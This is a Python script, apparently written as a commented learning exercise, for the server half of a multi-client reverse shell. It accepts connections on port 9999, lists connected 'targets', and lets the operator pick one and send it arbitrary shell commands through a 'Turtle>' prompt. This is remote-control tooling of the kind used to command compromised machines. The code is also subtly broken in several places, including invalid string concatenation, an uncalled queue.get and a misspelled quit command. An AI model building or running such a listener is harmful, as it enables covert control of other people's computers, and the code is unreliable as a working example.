import socket #socket is a way by which two computers connect to each other
import sys #is used to implement command line code in python
#for multi threading add the following commands
import threading
import time
from queue import Queue

number_of_threads = 2#it is two because we want to do two things simultaneously
job_number = [1,2]#creating  a list of the two threads
#the first thread  is to listen for connection and after accepting connection listens for more connection
#second thread sends commands and handles connection
queue = Queue()#queue for waiting
all_connections = []#to store allthe object connection
all_address = []#to store all the ip address and port number of connection


#create a socket (connect two computers together)
def create_socket():
    try:   
#creating global variables
        global host
        global port
        global s

#defining the global variables
        host = ""#the server.py file is going to be put inside itself so is is going to use its own host\
        port = 9999 #uncommon port , not mostly used
# creating a socket
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error" . str(msg))
        
        #how to bind socket to host and port
        #and listening for connection
#create a function for binding
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port " +str(port))
        s.bind((host,port))#binding the socket with the host and port
        s.listen(5)#listens to various connection up to5 connections,if it exceeds 5 it throws an error and recurse again
    except socket.error as msg:
        print("SOCKET BINDING WAS NOT SUCCESSFUL". str(msg) +"\n" + "Retrying...")
        bind_socket()#using recursion when there is an error binding the code keeptrying to bind
        #listrening for connections
#thsi function is for multithreding
#handle connection,saving connection to a list
#closing previous connectionswhen server.py file is restarted
def accepting_connection():
    for c in all_connections:
        c.close()#looping through each connection and closing them
    del all_connections[:]
    del all_address[:]#deleting the addresses also

    #create aa while loop to last through out the connection
    while True:
        try:
            conn,address = s.accept()
            s.setblocking(1)#set timeout from happening
            #is used when a connection is not used for a while that is shouldnt time out
            #the (1) means false

            all_connections.append(conn)
            all_address.append(address)#this two codes append or add all the connectionc
            #and address to this list

            print("Connection has been established " + address[0])#print a statement and a ip address
        except:
            print("Error accepting connections")

            #this code is just for accepting the first connection
            # and for all the client
            # all this code id running in the first thread that accepts multiple connections
#the second thread 1,see all connections and select a client then sed commands

#interactive prompt creation
def start_turtle():#how to create your own terminal
    
    while True:
        cmd = input("Turtle> ")# a what iipconfig


        if cmd =='list':#this function list all your client that are connected
            list_connections()#it first shows client id,then name of the client

        elif 'select'in cmd:#if a select key word it written
            conn = get_target(cmd)#this is a function that would get the target the developer wants
            #it is going to return a connection object , that is why it iss saved in a conn variable
            if conn is not None:#if the connection is still connected send command if not exit
                send_target_commands(conn)#the send commands to that target
        else:#if the select key word was not typed
            print("Command not recognized")

# we are going to display all current active connections
def list_connections():
    results = ''#create a variable for the connections

    #this for loop iterate thrugh the all_connections list
    #it increases the value of (i) and because of the enumerate keyword
    #(i) is initially set as 0
    for i,conn in enumerate(all_connections):
        try:#this is to see if all connections are active
            conn.send(str.encode(' '))#send a dummy connection
            conn.recv(201480)
        except:
            del all_connection[i]
            del all_address[i]
            continue#this continue continues, it is only executed when the connection is empty
        #but if the client sends back a chunk
        results = str(i) + "   " +str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"
        #this code prints the connection that replied with the current ip address and port

    print("------Client------" + "\n" + results)   
#the continue line ignores any code in that block and moves to the next block

#creating  a get_target fucntion, to pick/choose a target
def get_target(cmd):
    try:
        target = cmd.replace('select ','')#target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to : " +str(all_address[target][0]))
        print(str(all_address[target][0] + ">", end=""))
        return conn
        #192.89.98.98 > dir
    except:
        print("Selection not found")
        return None    


#send command to client/target or friend
def send_target_commands(conn):#add the send command from the accept fucntion
    while True:
        try:
            cmd = input()#this line takes input from me the sender
            if cmd =='qiut':#if i input 'quit' the prograam should
                break #if the commnd is quit the code goes back to the beginning of the code
            if len(str.encode(cmd)) > 0:#the command input must be more than 0
                conn.send(str.encode(cmd))#encodes the connection,this connection dosent send in string but bits
#the code below would be what we would get fro the user,encoded in chunks of 1024 bits and an encoding of ft-8

                client_response = str(conn.recv(20480),"utf-8")            
                print(client_response,end="")#then this code prints the recieved message and goes to the next line
        except:
            print("Error sending command")
            break#if the client encounters an error we leave 
        #this function and got tot the start turtle function
#Multi threading 
#create a workers thread
#create a queue
#the thread looks for jobs in a queue
#work according to the work function

#create workers thread
def create_workers():
    for _ in range(number_of_threads ):
        t = threading.Thread(target=work)
        #when a thread has been created you have to target the 
        #thread to a work(command)
        t.daemon = True#ends the threading whenever the program ends
        t.start()
#handle every job in the queue
def work():
    while True:#an infinite loop for choosing the thread to run
        x = queue.get        
        if x == 1 :
            create_socket()
            bind_socket()#if the thread is 1 run the create socket function
            #run the bind socket function
            #run the accepting connection function
            accepting_connection()
        if x == 2:
            start_turtle()
        queue.task_done()    
#creating the jobs,the amount of work we want to run
def create_jobs():
    for x in job_number:#iterate through the job number list 
        #and store them in the queue
        queue.put(x)

    queue.join()            

create_workers()
create_jobs()